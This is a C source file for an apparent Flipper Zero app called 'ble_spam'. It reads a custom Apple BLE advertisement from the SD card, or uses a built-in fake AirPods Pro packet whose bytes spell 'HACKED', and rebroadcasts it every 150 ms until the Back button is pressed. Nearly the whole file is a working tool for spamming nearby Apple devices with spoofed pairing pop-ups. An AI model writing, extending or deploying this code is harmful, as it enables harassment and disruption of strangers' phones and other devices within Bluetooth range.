#include <furi.h>
#include <furi_hal.h>
#include <storage/storage.h>
#include <furi_hal_bt.h>
#include <furi_hal_gpio.h>
#include "protocols/_registry.h"

#define CUSTOM_PACKETS_PATH EXT_PATH("apps_data/ble_spam/apple_custom.txt")
#define MAX_CUSTOM_PAYLOAD_LEN 31

static uint8_t custom_payload[MAX_CUSTOM_PAYLOAD_LEN];
static uint8_t custom_payload_len = 0;

static uint8_t hex_to_byte(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static void load_custom_apple_packet(void) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    custom_payload_len = 0;
    
    if(storage_file_open(file, CUSTOM_PACKETS_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buffer[128]; // Корректный массив-буфер для строки
        uint16_t read = storage_file_read(file, buffer, sizeof(buffer) - 1);
        if(read > 0) {
            buffer[read] = '\0';
            char* hex_start = strchr(buffer, ':');
            if(hex_start) {
                hex_start++;
                while(*hex_start && custom_payload_len < MAX_CUSTOM_PAYLOAD_LEN) {
                    if(*hex_start == ' ' || *hex_start == '\r' || *hex_start == '\n') {
                        hex_start++;
                        continue;
                    }
                    if(*hex_start && *(hex_start + 1)) {
                        custom_payload[custom_payload_len] = (hex_to_byte(*hex_start) << 4) | hex_to_byte(*(hex_start + 1));
                        custom_payload_len++;
                        hex_start += 2;
                    } else {
                        break;
                    }
                }
            }
        }
    }
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

// Функция-перехватчик BLE пакетов
void ble_spam_send_packet(const uint8_t* original_data, uint8_t original_len) {
    load_custom_apple_packet();

    if(custom_payload_len > 0) {
        // Если файл apple_custom.txt найден и прочитан — принудительно шлем его
        furi_hal_bt_extra_beacon_set_data(custom_payload, custom_payload_len);
    } else {
        // Если файла нет — отправляем оригинальный пакет, переданный в функцию
        furi_hal_bt_extra_beacon_set_data(original_data, original_len);
    }
}

// Главная входная точка приложения для линкера
int32_t ble_spam_app(void* p) {
    UNUSED(p);
    
    furi_hal_bt_extra_beacon_stop();
    
    // Дефолтный пакет (AirPods Pro) на случай отсутствия файла на SD
    uint8_t default_pack[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x10, 0x42, 0x04, 0x48, 0x41, 0x43, 0x4B, 0x45, 0x44};
    
    while(1) {
        // Вызываем наш перехватчик для отправки данных
        ble_spam_send_packet(default_pack, sizeof(default_pack));
        furi_hal_bt_extra_beacon_start();
        
        furi_delay_ms(150);
        
        furi_hal_bt_extra_beacon_stop();
        
        // Проверяем нажатие кнопки Назад для безопасного выхода из цикла
        if(furi_hal_gpio_read(&gpio_button_back) == false) {
            break;
        }
    }

    return 0;
}
